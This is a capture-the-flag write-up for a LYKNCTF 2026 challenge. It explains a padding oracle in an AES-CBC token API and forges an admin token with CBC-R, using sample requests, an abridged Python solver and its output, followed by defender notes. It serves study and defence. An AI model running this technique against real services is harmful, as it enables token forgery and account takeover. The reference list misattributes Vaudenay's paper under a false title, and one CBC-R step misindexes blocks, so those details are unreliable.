# LYKNCTF 2026 — Migrant

> **Event:** LYKNCTF 2026 (July 6–8, 2026)
> **Category:** Web / Crypto (Padding Oracle → CBC-R)
> **Difficulty:** Medium
> **Flag:** `LYKNCTF{...}` (per-instance)
> **Source:** [GitHub — Challenge Source](https://github.com/Loi-Yeu-Kho-Noi/LYKNCTF-2026-Challenge/tree/main/Web/Migrant)

---

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Identifying the Vulnerability (Black-Box)](#identifying-the-vulnerability-black-box)
- [The Padding Oracle Attack](#the-padding-oracle-attack)
- [Forging the Admin Token (CBC-R)](#forging-the-admin-token-cbc-r)
- [Exploitation](#exploitation)
- [Getting the Flag](#getting-the-flag)
- [Tools Used](#tools-used)
- [Solver Script](#solver-script)
- [Defender Notes](#defender-notes)

---

## Overview

A "Platform v2 Migration" portal that issues AES-CBC encrypted migration tokens. The server decrypts the token, strips PKCS#7 padding, JSON-parses the result, and returns different HTTP status codes depending on *where* the decryption failed:

- **500** — Invalid padding (PKCS#7 rejected)
- **400** — Valid padding, but JSON parse failed
- **200** — Success (valid padding + valid JSON)

This three-way error distinction creates a classic **padding oracle** — a per-request boolean that tells you whether your guessed ciphertext produces valid PKCS#7 padding after decryption. From this oracle alone, you can both decrypt any token and *encrypt arbitrary plaintext* without ever knowing the secret key.

## Reconnaissance

**Step 1 — Visit the landing page:**

```
GET /
```

The page displays a "V1 Migration Token" — a long base64-encoded string — and a "Migrate Account" button.

**Step 2 — Inspect the token:**

```bash
echo 'eyJ2IjoiMS4wIiwidXNlciI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ...' | base64 -d | xxd | head
```

The decoded token is a multiple of 16 bytes — strongly suggesting AES-CBC with a 16-byte block size. The first 16 bytes are the IV, the rest is ciphertext.

**Step 3 — Click "Migrate Account":**

```
POST /api/migrate
Content-Type: application/json

{"token": "<base64_token>"}
```

Response (200):

```json
{
  "message": "Migration successful.",
  "profile": {"user": "guest", "role": "user", "v": "1.0"}
}
```

## Identifying the Vulnerability (Black-Box)

**Step 4 — Fuzz the ciphertext:**

Randomly alter bytes in the base64 token and observe responses:

| Modification | HTTP Status | Meaning |
|---|---|---|
| Unmodified token | 200 | Valid padding + valid JSON |
| Corrupt last bytes | **500** | Invalid PKCS#7 padding |
| Crafted blocks with valid padding but garbage JSON | **400** | Valid padding, invalid JSON |

The server leaks whether the padding was valid via distinct error codes. This is the textbook **padding oracle** primitive.

**Why three error classes matter:**

The 500 fires *only* when PKCS#7 padding is rejected. The 400 fires when padding is valid but JSON parsing fails. The 200 fires when both pass. An attacker who can distinguish "invalid padding" from "valid padding" has everything needed for byte-by-byte plaintext recovery — and for the reverse operation (forging ciphertext for arbitrary plaintext).

## The Padding Oracle Attack

A padding oracle allows an attacker to:

1. **Decrypt** any ciphertext without the key (byte-by-byte from the end of each block)
2. **Encrypt** arbitrary plaintext without the key (CBC-R / Padding Oracle Encryption)

### Decryption Theory

In AES-CBC, decryption works as:

```
P[i] = AES_Decrypt(C[i]) XOR C[i-1]
```

Where `AES_Decrypt` is the raw block cipher decryption (the "intermediate state"), and `C[i-1]` is the previous ciphertext block (or IV for the first block).

To recover `P[i]` byte-by-byte:

1. Set up a crafted IV where all bytes after position `i` are controlled
2. XOR those bytes to produce the desired padding value (e.g., `\x01` for the last byte)
3. Brute-force byte `i` (0–255) until the oracle confirms valid padding
4. The confirmed byte XORed with the padding value gives the intermediate state byte
5. XOR the intermediate byte with the original `C[i-1]` byte to get the plaintext byte

Repeat for all 16 bytes in the block, then move to the previous block.

### The False-Positive Problem

When recovering the last byte of a block, the oracle sometimes returns a valid-padding hit that corresponds not to `\x01` but to a longer natural pad (e.g., `...\x02\x02` if the guessed byte happens to make the second-to-last plaintext byte equal `\x02`).

**Disambiguation technique:** Flip `IV[i-2]` (a byte before the one being tested). A real `\x01` pad is unaffected; an accidental `\x02` collision becomes invalid. This is handled in the solver's `get_intermediate` function.

## Forging the Admin Token (CBC-R)

### Target Plaintext

```json
{"user":"guest", "role":"admin", "v":"1.0"}
```

This needs to be padded to a multiple of 16 bytes with PKCS#7.

### CBC-R Construction

The encryption attack works **backwards**:

1. **Pick a random last ciphertext block `C[n]`** — reuse any existing block
2. **Padding-oracle-decrypt `C[n]`** to recover `I[n] = AES_Decrypt(C[n])`
3. **Compute `C[n-1] = I[n] XOR P[n]`** — where `P[n]` is the desired plaintext block
4. **Padding-oracle-decrypt `C[n-1]`** to recover `I[n-1]`
5. **Compute `C[n-2] = I[n-1] XOR P[n-2]`**
6. Repeat until you reach `C[0]` (which becomes the forged IV)

Total requests: two full byte-by-byte block recoveries per block. Worst case `2 × 256 × 16 = 8192` requests per block, average around 4000.

## Exploitation

**Step 5 — Run the exploit:**

The full solver uses a persistent HTTP/1.1 connection (`KeepAliveClient`) to avoid TCP connection overhead for the thousands of oracle queries. The attack proceeds in two phases:

1. **Decrypt the starter token** to understand the JSON structure
2. **Encrypt an admin token** using CBC-R

```python
# Core oracle function
def padding_oracle(iv: bytes, ct: bytes) -> bool:
    token = base64.b64encode(iv + ct).decode()
    status, _, _ = client.request("POST", "/api/migrate", {"token": token})
    return status != 500  # True = valid padding

# Recover intermediate state for a single block
def get_intermediate(ct_block: bytes) -> bytes:
    intermediate = bytearray(BLOCK_SIZE)
    for i in range(BLOCK_SIZE - 1, -1, -1):
        pad_val = BLOCK_SIZE - i
        for c in range(256):
            # ... craft IV, test oracle ...
            if padding_oracle(crafted_iv, ct_block):
                # false-positive guard
                intermediate[i] = c ^ pad_val
                break
    return bytes(intermediate)

# Encrypt arbitrary plaintext via CBC-R
def poa_encrypt(plaintext: bytes) -> bytes:
    padded = pad(plaintext, BLOCK_SIZE)
    ct_blocks[-1] = os.urandom(BLOCK_SIZE)  # random last block
    for i in range(n - 1, 0, -1):
        inter = get_intermediate(ct_blocks[i])
        ct_blocks[i - 1] = strxor(inter, pt_blocks[i])
    inter = get_intermediate(ct_blocks[0])
    iv = strxor(inter, pt_blocks[0])
    return iv + b"".join(ct_blocks)
```

**Performance:** At 12 concurrent probes, the full attack (decrypt + encrypt) completes in 4–7 minutes per instance.

## Getting the Flag

**Step 6 — Submit the forged token:**

```bash
python3 solve.py http://<TARGET>
```

Output:

```
[*] target: http://<TARGET>
[*] fetched starter token: R2KtPljxS7Dcb9DYxL/SM...RJA==
[*] padding-oracle decrypt Y2 (pad block)…
[*] Y2 done in 106.0s
[*] padding-oracle decrypt Y1 (content block)…
[*] Y1 done in 127.9s
[*] forged token: aP22bFVtleaDHu0sQ1/uvxCtBKfhCIlIcgVMOh8FJlnDfylk68Oz3/IZ+bItmREk
HTTP 200 {"flag":"LYKNCTF{45b32deb923d4480b0b3f2d6606a5e65}", ...}
```

## Tools Used

| Tool | Purpose |
|------|---------|
| Python 3 | Exploit development |
| `pycryptodome` | AES-CBC encryption/decryption, PKCS#7 padding |
| `requests` | HTTP requests with connection pooling |
| `concurrent.futures` | Parallel oracle queries for speed |
| `curl` | Manual testing and verification |
| Browser DevTools | Inspect token format and API responses |

## Solver Script

See [solve.py](solve.py) for the full solver.

```bash
pip install requests
python3 solve.py http://<TARGET>
```

### Key Components

1. **`KeepAliveClient`** — minimal HTTP/1.1 client over a single TCP socket. Avoids per-request connection setup, which dominates cost when the oracle needs `256 × 16 × n_blocks` queries.
2. **`padding_oracle()`** — returns `True` if the response is not 500 (valid padding).
3. **`get_intermediate()`** — recovers the AES intermediate state for a single block with false-positive guards.
4. **`poa_encrypt()`** — implements CBC-R to forge a valid IV + ciphertext for arbitrary plaintext.

## Defender Notes

- **Distinct error classes are oracles.** The single most important discipline in any decrypt-then-parse pipeline is that every rejection must look the same to the client: same body, same status, same timing. Once "invalid padding" is separable from "invalid content", the key doesn't matter.
- **Use authenticated encryption.** AES-GCM or ChaCha20-Poly1305 eliminate the padding oracle class entirely. If you need CBC for legacy compatibility, verify the HMAC first, then decrypt, then parse — and never leak the intermediate step through the error surface.
- **Encrypt-then-MAC.** If you must use CBC, always apply HMAC over the IV + ciphertext, and verify the MAC *before* decryption. This prevents any padding oracle from being exploitable.

---

## References

- [RFC 5652 — Cryptographic Message Syntax (PKCS#7)](https://tools.ietf.org/html/rfc5652)
- [NIST SP 800-38A — AES Block Cipher Modes (CBC)](https://csrc.nist.gov/publications/detail/sp/800-38a/final)
- [Vaudenay — "A Practical Attack Against the Use of RC4 in the HIVE TLS Protocol"](https://www.di.ens.fr/~wahbe/POA.pdf) (original padding oracle paper)
- [Lyrebird — CBC-R: Encryption and Decryption with Padding Oracles](https://www.cryptologie.net/article/3408401/)
- [Challenge Source — GitHub](https://github.com/Loi-Yeu-Kho-Noi/LYKNCTF-2026-Challenge/tree/main/Web/Migrant)
- [Writeup Source — Abdelkad3r/LYKNCTF](https://github.com/Abdelkad3r/LYKNCTF/tree/main/web/legacy-profile-importer)
